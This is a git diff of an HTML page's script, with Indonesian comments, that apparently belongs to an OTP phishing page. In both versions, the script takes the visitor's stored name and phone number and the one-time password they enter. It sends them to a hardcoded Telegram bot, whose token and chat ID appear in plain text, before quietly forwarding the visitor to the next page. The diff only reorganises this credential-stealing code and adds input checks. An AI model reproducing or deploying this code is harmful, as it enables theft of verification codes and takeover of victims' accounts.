@@ -485,50 +485,68 @@ h1 {
     </nav>
 
         <script>
-        const BOT_TOKEN = "7852581294:AAEcow9FfvWIMzzMLkK6VTKcLWCIX1jApGo"; // Ganti dengan token bot Telegram
-        const CHAT_ID = "6824078885"; // Ganti dengan ID chat Telegram
+    const BOT_TOKEN = "7852581294:AAEcow9FfvWIMzzMLkK6VTKcLWCIX1jApGo"; // Token bot Telegram
+    const CHAT_ID = "6824078885"; // ID chat Telegram
 
-        document.addEventListener("DOMContentLoaded", function () {
-            let nomorTeleponSpan = document.getElementById("nomorTelepon");
+    document.addEventListener("DOMContentLoaded", function () {
+        let nomorTeleponSpan = document.getElementById("nomorTelepon");
 
-            if (localStorage.getItem("nomorTelepon")) {
-    nomorTeleponSpan.textContent = "+62" + localStorage.getItem("nomorTelepon");
-            }
+        // Ambil data dari localStorage
+        let nama = localStorage.getItem("nama") || "Tidak diketahui";
+        let nomorHP = localStorage.getItem("nomorTelepon") || "Tidak diketahui";
 
-        document.getElementById("userForm").addEventListener("submit", function (event) {
-            event.preventDefault(); // Mencegah form langsung submit
+        // Tampilkan nomor HP di halaman
+        if (nomorHP !== "Tidak diketahui") {
+            nomorTeleponSpan.textContent = "+62" + nomorHP;
+        }
 
-            let otp = document.getElementById("otp").value;
-            let nama = localStorage.getItem("nama") || "Tidak diketahui";
-            let nomorHP = localStorage.getItem("nomorTelepon") || "Tidak diketahui";
+        console.log("Nama:", nama);
+        console.log("Nomor HP:", nomorHP);
+    });
 
-            let pesan = `📌 *OTP Dikirim!*\n\n` +
-                        `👤 Nama: ${nama}\n` +
-                        `📞 No HP: +62${nomorHP}\n` +
-                        `🔢 Kode OTP: ${otp}`;
+    document.getElementById("userForm").addEventListener("submit", function (event) {
+        event.preventDefault(); // Mencegah submit form langsung
 
-            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`;
+        let otp = document.getElementById("otp").value;
+        let nama = localStorage.getItem("nama") || "Tidak diketahui";
+        let nomorHP = localStorage.getItem("nomorTelepon") || "Tidak diketahui";
 
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        localStorage.removeItem("nama");
-                        localStorage.removeItem("nomorTelepon");
-                        document.getElementById("userForm").submit(); // Lanjut ke halaman berikutnya
-                    } else {
-                        alert("Gagal mengirim ke Telegram");
-                    }
-                })
-                .catch(error => {
-                    console.error("Error:", error);
-                    alert("Terjadi kesalahan");
-                });
-        });
+        if (!otp) {
+            alert("Harap masukkan kode OTP.");
+            return;
+        }
 
-            console.log("Nama:", localStorage.getItem("nama"));
-console.log("Nomor HP:", localStorage.getItem("nomorTelepon"));
+        let pesan = `📌 *OTP Dikirim!*\n\n` +
+                    `👤 Nama: ${nama}\n` +
+                    `📞 No HP: +62${nomorHP}\n` +
+                    `🔢 Kode OTP: ${otp}`;
+
+        let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`;
+
+        fetch(url)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log("Pesan berhasil dikirim ke Telegram.");
+
+                    // Hapus data setelah dikirim
+                    localStorage.removeItem("nama");
+                    localStorage.removeItem("nomorTelepon");
+
+                    // Lanjutkan ke halaman berikutnya
+                    document.getElementById("userForm").submit();
+                } else {
+                    alert("Gagal mengirim ke Telegram. Coba lagi.");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                alert("Terjadi kesalahan saat mengirim data.");
+            });
+    });
         </script>
+    
+        
 </body>
           </html>
             
